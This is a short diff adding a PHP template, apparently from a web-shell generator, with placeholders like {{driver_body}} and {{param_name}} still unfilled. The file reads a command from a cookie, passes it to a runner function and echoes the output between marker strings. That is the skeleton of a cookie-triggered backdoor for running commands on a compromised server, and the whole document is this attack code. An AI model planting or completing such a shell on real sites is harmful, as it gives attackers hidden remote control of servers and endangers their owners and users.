@@ -1,0 +1,8 @@
+<?php
+function __ss_run($__ss_cmd) {
+    {{driver_body}}
+}
+$__ss_cmd = $_COOKIE["{{param_name}}"] ?? "";
+if ($__ss_cmd !== "") {
+    echo "{{response_begin}}" . __ss_run($__ss_cmd) . "{{response_end}}";
+}
